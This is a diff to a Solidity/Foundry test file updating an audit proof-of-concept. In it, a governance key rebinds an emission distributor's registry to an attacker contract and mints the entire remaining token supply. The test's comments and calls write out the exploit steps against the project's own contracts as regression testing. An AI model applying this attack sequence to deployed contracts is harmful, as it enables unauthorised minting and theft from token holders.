@@ -48,8 +48,8 @@ contract EvilRegistry {
     }
 }
 
-/// @notice PP3.2 reproduction PoC for root cause F.1 — `EmissionDistributor.setIncendiaryRegistry`
-///         is an unbounded, freely-rebindable mint oracle: the pre-dissolution governance key
+/// @notice PP3.2 reproduction PoC for root cause F.1 — `EmissionDistributor.proposeIncendiaryRegistry` /
+///         `acceptIncendiaryRegistry` is an unbounded, freely-rebindable mint oracle: the pre-dissolution governance key
 ///         mints the entire remaining AuMM supply to itself in four transactions with zero capital.
 /// @dev Uses the REAL `AuMM`, `AuMMMinterRouter` and `EmissionDistributor` (not `MockAuMM`, not the
 ///      harness) so the mint against `MAX_SUPPLY` is genuine. Peripheral reads (`GaugeRegistry`,
@@ -118,6 +118,10 @@ contract P1_F1_Test is Test {
         assertEq(aumm.balanceOf(ATTACKER), 0, "precondition: attacker holds nothing");
         EvilRegistry evil = new EvilRegistry(huge);
 
+        // Steps 1 through 3a run one block before genesis so the two-step's accept can land
+        // exactly AT genesis, keeping phase 1's cap window empty.
+        vm.roll(GENESIS_BLOCK_ - 1);
+
         // 1. seat the attacker as the recorder for the fake pool `evil` (pool arg unvalidated)
         vm.prank(GOV);
         distributor.setAuMTContractForPool(address(evil), ATTACKER);
@@ -126,9 +130,12 @@ contract P1_F1_Test is Test {
         vm.prank(ATTACKER);
         distributor.recordDeposit(address(evil), ATTACKER, 1e18);
 
-        // 3. repoint the boost oracle at the attacker's own contract
+        // 3. arm the boost oracle at the attacker's own contract — committed one block later (the non-atomicity the two-step buys)
         vm.prank(GOV);
-        distributor.setIncendiaryRegistry(address(evil));
+        distributor.proposeIncendiaryRegistry(address(evil));
+        vm.roll(GENESIS_BLOCK_);
+        vm.prank(GOV);
+        distributor.acceptIncendiaryRegistry();
 
         // 4. the attacker claims: claim() credits msg.sender's position and mints to `to`,
         //    so the attacker must be the caller (the position was seated under ATTACKER in step 2)
@@ -199,12 +206,19 @@ contract P1_F1_Test is Test {
         );
         EvilRegistry evil = new EvilRegistry(aumm.MAX_SUPPLY());
 
+        // Steps 1 through 3a run one block before genesis so the two-step's accept can land
+        // exactly AT genesis, keeping phase 1's cap window empty.
+        vm.roll(GENESIS_BLOCK_ - 1);
+
         vm.prank(GOV);
         h.setAuMTContractForPool(address(evil), ATTACKER);
         vm.prank(ATTACKER);
         h.recordDeposit(address(evil), ATTACKER, 1e18);
         vm.prank(GOV);
-        h.setIncendiaryRegistry(address(evil));
+        h.proposeIncendiaryRegistry(address(evil));
+        vm.roll(GENESIS_BLOCK_);
+        vm.prank(GOV);
+        h.acceptIncendiaryRegistry();
 
         // Settle once at genesis so the cursor is anchored and the cap window below is well defined.
         vm.prank(ATTACKER);
